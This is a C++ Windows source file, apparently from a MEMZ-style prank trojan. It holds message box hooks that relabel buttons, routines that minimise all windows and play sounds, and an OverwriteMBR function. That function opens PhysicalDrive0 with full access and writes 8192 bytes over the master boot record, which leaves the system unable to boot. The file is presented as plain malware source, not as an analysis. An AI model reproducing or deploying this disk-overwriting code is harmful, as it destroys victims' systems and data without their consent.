#include <iostream>

#include <Windows.h>

#include "util.h"

#pragma comment(lib, "WINMM.lib")

using namespace std;

const int MIN_ALL = 419;
const int MIN_ALL_UNDO = 416;

#pragma region Message Boxes
HHOOK mbHook;
int SpecialMsgBoxA(TCHAR *szText, TCHAR *szCaption, UINT uType) {
	mbHook = SetWindowsHookEx(WH_CBT, HookMsgBoxA, NULL, GetCurrentThreadId());
	int retval = MessageBox(NULL, szText, szCaption, uType); //show your standard message box, but with new buttons

	UnhookWindowsHookEx(mbHook); //unhook
	return retval; //in case we want to get the response
}

LRESULT CALLBACK HookMsgBoxA(int nCode, WPARAM wParam, LPARAM lParam) {
	HWND hwnd;

	if (nCode < 0)
		return CallNextHookEx(mbHook, nCode, wParam, lParam);

	switch (nCode) {
		case HCBT_ACTIVATE:
			hwnd = (HWND)wParam; //message box handle
			SetWindowTextW(GetDlgItem(hwnd, IDYES), L"MEMZ"); //change the text
			SetWindowTextW(GetDlgItem(hwnd, IDNO), L"VineMEMZ"); //change the text
			break;
	}

	return CallNextHookEx(mbHook, nCode, wParam, lParam);
}

int SpecialMsgBoxB(TCHAR *szText, TCHAR *szCaption, UINT uType) {
	mbHook = SetWindowsHookEx(WH_CBT, HookMsgBoxB, NULL, GetCurrentThreadId());
	int retval = MessageBox(NULL, szText, szCaption, uType); //show your standard message box, but with new buttons

	UnhookWindowsHookEx(mbHook); //unhook
	return retval; //in case we want to get the response
}

LRESULT CALLBACK HookMsgBoxB(int nCode, WPARAM wParam, LPARAM lParam) {
	HWND hwnd;

	if (nCode < 0)
		return CallNextHookEx(mbHook, nCode, wParam, lParam);

	switch (nCode) {
		case HCBT_ACTIVATE:
			hwnd = (HWND)wParam; //message box handle
			SetWindowTextW(GetDlgItem(hwnd, IDOK), L"OK I'll"); //change the text
			break;
	}

	return CallNextHookEx(mbHook, nCode, wParam, lParam);
}
#pragma endregion

VOID MinimizeAll() {
	HWND lHwnd = FindWindow(L"Shell_TrayWnd", NULL);
	SendMessage(lHwnd, WM_COMMAND, MIN_ALL, 0);
}

VOID UndoMinimizeAll() {
	HWND lHwnd = FindWindow(L"Shell_TrayWnd", NULL);
	SendMessage(lHwnd, WM_COMMAND, MIN_ALL_UNDO, 0);
}

VOID PlaySoundM(LPWSTR sound) {
	mciSendString((L"play " + wstring(sound)).c_str(), NULL, 0, NULL);
}

VOID OverwriteMBR(LPCVOID mbr) {
	DWORD write;
	HANDLE MBR = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
	WriteFile(MBR, mbr, 8192, &write, NULL);
	CloseHandle(MBR);
}